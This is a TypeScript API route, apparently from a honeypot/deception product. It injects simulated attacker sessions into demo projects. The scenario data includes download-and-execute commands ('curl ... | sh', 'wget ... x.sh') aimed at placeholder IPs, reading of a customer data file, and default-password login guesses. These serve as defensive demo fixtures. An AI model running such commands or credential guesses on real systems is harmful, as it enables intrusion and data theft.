import { randomInt } from 'node:crypto';
import type { FastifyInstance } from 'fastify';
import { ulid } from 'ulid';
import { z } from 'zod';
import { db } from '../db/client.js';
import { env } from '../env.js';
import { audit } from '../lib/audit.js';
import { HttpError } from '../lib/errors.js';
import { parse } from '../lib/parse.js';
import { projectAccess, requireSession } from '../plugins/auth-session.js';
import { ingestEvents } from './ingest.js';

type Ev = Record<string, unknown>;
type Step = { gap: number; ev: Ev };

const web = (decoy: string, url: string, extra: Ev = {}): Ev => ({
  sensor: 'web',
  decoy_id: decoy,
  is_decoy: true,
  dst_service: `http:${url}`,
  event_type: 'http.request',
  method: 'GET',
  url,
  status_code: 200,
  ...extra,
});
const ssh = (type: string, extra: Ev = {}): Ev => ({
  sensor: 'ssh',
  decoy_id: 'ssh-db-backup-01',
  is_decoy: true,
  dst_service: 'ssh:22',
  event_type: type,
  ...extra,
});

const SCENARIOS: Record<string, (ip: string) => Step[]> = {
  targeted: () => [
    {
      gap: 0,
      ev: web('web-admin-admin', '/admin', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
      }),
    },
    {
      gap: 7,
      ev: web('web-bait-env', '/.env', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
        outcome: 'success',
      }),
    },
    { gap: 9, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 6,
      ev: ssh('auth.attempt', { username: 'deploy', password_masked: 'W***1', outcome: 'failure' }),
    },
    {
      gap: 8,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 11,
      ev: ssh('command.exec', { username: 'admin', command: 'whoami', outcome: 'success' }),
    },
    {
      gap: 8,
      ev: ssh('command.exec', { username: 'admin', command: 'uname -a && id', outcome: 'success' }),
    },
    {
      gap: 14,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'ls -la /srv/exports',
        outcome: 'success',
      }),
    },
    {
      gap: 12,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cat /srv/exports/customer_data.csv',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'wget http://198.51.100.23/x.sh -O /tmp/x.sh',
        outcome: 'failure',
      }),
    },
    {
      gap: 16,
      ev: {
        sensor: 'sdk',
        is_decoy: false,
        dst_service: 'app:/api/payments',
        event_type: 'asset.access',
        asset_name: 'Payments API',
        method: 'GET',
        url: '/api/payments/export',
        status_code: 200,
        outcome: 'success',
      },
    },
  ],
  opportunistic: () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-libssh_0.9.6' }) },
    ...['root', 'admin', 'ubuntu', 'test', 'oracle'].map(
      (u): Step => ({
        gap: 1,
        ev: ssh('auth.attempt', { username: u, password_masked: '1****6', outcome: 'failure' }),
      }),
    ),
    {
      gap: 1,
      ev: ssh('auth.attempt', { username: 'root', password_clear: 'toor', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', { username: 'root', command: 'uname -a', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'cat /proc/cpuinfo',
        outcome: 'success',
      }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'curl -s http://198.51.100.99/m.sh | sh',
        outcome: 'failure',
      }),
    },
  ],
  noise: () => [
    { gap: 0, ev: web('web-admin-admin', '/', { user_agent: 'zgrab/0.x' }) },
    {
      gap: 1,
      ev: web('web-bait-env', '/robots.txt', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/favicon.ico', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
  ],
};

const Body = z.object({
  // `ps-use-case` is the dashboard's button scenario name. `ps-attacker` is
  // used by the attacker console's safe replay. Keep those public names
  // mapped onto the platform's canonical replay scenarios.
  scenario: z
    .enum(['targeted', 'opportunistic', 'noise', 'ps-use-case', 'ps-attacker'])
    .default('targeted'),
  scenarioId: z.enum(['targeted', 'opportunistic', 'noise', 'ps-use-case', 'ps-attacker']).optional(),
  src_ip: z.union([z.ipv4(), z.ipv6()]).optional(),
});

export async function demoRoutes(app: FastifyInstance): Promise<void> {
  app.post('/v1/projects/:pid/demo/replay', { preHandler: requireSession }, async (req, reply) => {
    const { project, user } = await projectAccess(
      req,
      (req.params as { pid: string }).pid,
      'owner',
    );
    if (!env.DEMO_MODE && !['demo', 'dev', 'development'].includes(project.environment)) {
      throw new HttpError(
        403,
        'not_demo_project',
        'Replay is only available for demo projects (environment=demo)',
      );
    }
    const body = parse(Body, req.body ?? {});
    const requestedScenario = body.scenarioId ?? body.scenario;
    const scenario = requestedScenario === 'opportunistic' || requestedScenario === 'noise'
      ? requestedScenario
      : 'targeted';
    const ip = body.src_ip ?? `203.0.113.${randomInt(2, 250)}`;
    const steps = SCENARIOS[scenario]!(ip);

    // Re-time: the last event lands "now"; earlier ones are spread backwards by their gaps.
    const total = steps.reduce((s, x) => s + x.gap, 0);
    let t = Date.now() - total * 1000;
    const session = `demo-${ulid().slice(-8)}`;
    const raw = steps.map((s) => {
      t += s.gap * 1000;
      return {
        id: ulid(t),
        schema_version: 1,
        timestamp: new Date(t).toISOString(),
        src_ip: ip,
        session_id: session,
        count: 1,
        simulated: true,
        ...s.ev,
      };
    });
    const res = await ingestEvents({ projectId: project.id, rawEvents: raw });
    await audit(db, {
      orgId: project.orgId,
      projectId: project.id,
      actorType: 'user',
      actorId: user.id,
      action: 'demo.replay',
      metadata: { scenario, requested_scenario: requestedScenario, src_ip: ip },
      req,
    });
    return reply.status(202).send({
      scenario,
      src_ip: ip,
      accepted: res.accepted,
      duplicates: res.duplicates,
      rejected: res.rejected,
    });
  });
}
